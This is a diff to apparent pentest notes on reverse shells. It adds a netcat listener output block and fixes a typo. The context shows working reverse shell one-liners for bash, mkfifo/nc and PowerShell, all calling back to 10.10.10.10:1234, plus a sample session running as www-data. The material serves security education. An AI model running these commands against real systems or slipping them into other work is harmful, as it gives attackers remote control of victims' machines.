@@ -41,6 +41,7 @@ group default qlen 500
 The command we run depends on the victims OS, and what applications we can access. [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) has a comprehensive list of reverse shell commands that covers a wide range of compromised hosts.
 
 Here are a few examples of more reliable reverse shell commands for both Linux and Windows:
+
 ```bash
 # Linux
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' # Linux
@@ -54,7 +55,17 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-Once we've utilised an exploit to execute one of the above commands, we should recieve a connection in our
+Once we've utilised an exploit to execute one of the above commands, we should receive a connection in our `netcat` listener:
+
+```bash
+listening on [any] 1234 ... 
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572 
+
+id # Input
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Once we received our
 
 ---
 ## Bind Shell
